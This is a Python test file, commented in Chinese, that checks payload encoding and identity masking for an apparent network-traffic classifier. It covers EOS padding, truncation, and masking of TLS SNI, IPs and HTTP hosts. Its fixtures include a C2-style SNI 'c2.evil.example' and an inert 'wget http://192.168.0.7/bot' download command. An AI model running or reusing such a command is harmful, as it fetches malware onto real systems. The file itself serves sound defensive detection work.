"""_encode_payload() 的 PAD/EOS 邊界。src/models/encoders.py 的
TextCNN 編碼器在 max-pool 前把 PAD 位置蓋成 -inf，若一列序列全是 PAD，
max-pool 出來就是 -inf，過 Linear 會變 NaN——目前程式碼靠「payload 比視窗短
時一定寫入一個 EOS token」這個隱性假設撐住（見 encoders.py 的說明），
本身沒有測試也沒有 assert 保護，改 PAYLOAD_BYTES 或動到這段邏輯很容易
不小心破壞這個假設，所以專門測。
"""
import numpy as np

from src.features.view_p import EOS_TOKEN, MASK_TOKEN, PAD_TOKEN, _encode_payload, identity_mask


def test_empty_payload_has_at_least_one_non_pad_token():
    """全空 payload 是最極端的情況：這裡若沒有 EOS，整列全是 PAD，
    TextCNNEncoderB 的 max-pool 會拿到全 -inf，是 NaN 的直接成因。"""
    seq = _encode_payload(b"", length=8)
    assert (seq != PAD_TOKEN).any(), "全 PAD 的序列會讓 max-pool 出現 -inf"
    assert seq[0] == EOS_TOKEN


def test_short_payload_padded_with_eos_boundary():
    seq = _encode_payload(b"ab", length=8)
    assert seq[0] == ord("a")
    assert seq[1] == ord("b")
    assert seq[2] == EOS_TOKEN
    assert (seq[3:] == PAD_TOKEN).all()


def test_payload_exactly_fills_window_no_eos():
    """剛好塞滿視窗時不寫 EOS（沒有多餘位置），全部是真實 payload。"""
    payload = bytes(range(8))
    seq = _encode_payload(payload, length=8)
    assert (seq == np.frombuffer(payload, dtype=np.uint8)).all()
    assert PAD_TOKEN not in seq
    assert EOS_TOKEN not in seq


def test_payload_longer_than_window_truncated():
    payload = bytes(range(20))
    seq = _encode_payload(payload, length=8)
    assert len(seq) == 8
    assert (seq == np.frombuffer(payload[:8], dtype=np.uint8)).all()


def _client_hello(sni: bytes) -> bytes:
    """最小的 TLS ClientHello：只帶一個 server_name 擴充。"""
    ext_data = (len(sni) + 3).to_bytes(2, "big") + b"\x00" + len(sni).to_bytes(2, "big") + sni
    ext = b"\x00\x00" + len(ext_data).to_bytes(2, "big") + ext_data
    body = (b"\x03\x03" + b"\x00" * 32 + b"\x00" + b"\x00\x02\x13\x01" + b"\x01\x00"
            + len(ext).to_bytes(2, "big") + ext)
    hs = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + len(hs).to_bytes(2, "big") + hs


def test_identity_mask_covers_sni_and_nothing_else_in_handshake():
    """SNI 是 C2 伺服器的身分；遮掉它，但 handshake 其他結構必須保留給模型。"""
    p = _client_hello(b"c2.evil.example")
    m = identity_mask(p)
    start = p.index(b"c2.evil.example")
    assert m[start:start + len(b"c2.evil.example")].all()
    assert m.sum() == len(b"c2.evil.example")


def test_identity_mask_covers_ips_and_http_host():
    import socket
    p = (b"GET / HTTP/1.1\r\nHost: 10.1.2.3:8080\r\n\r\n"
         + b"wget http://192.168.0.7/bot; " + socket.inet_aton("172.16.5.9"))
    m = identity_mask(p, ips=("172.16.5.9",))
    for token in (b"10.1.2.3:8080", b"192.168.0.7"):
        s = p.index(token)
        assert m[s:s + len(token)].all()
    assert m[-4:].all(), "二進位形式的窗端點 IP 也要遮"
    assert not m[:4].any(), "GET 這種行為內容不能被遮"


def test_encode_payload_applies_mask_token():
    seq = _encode_payload(b"ping 8.8.8.8", length=16)
    assert (seq[5:12] == MASK_TOKEN).all()
    assert seq[0] == ord("p")
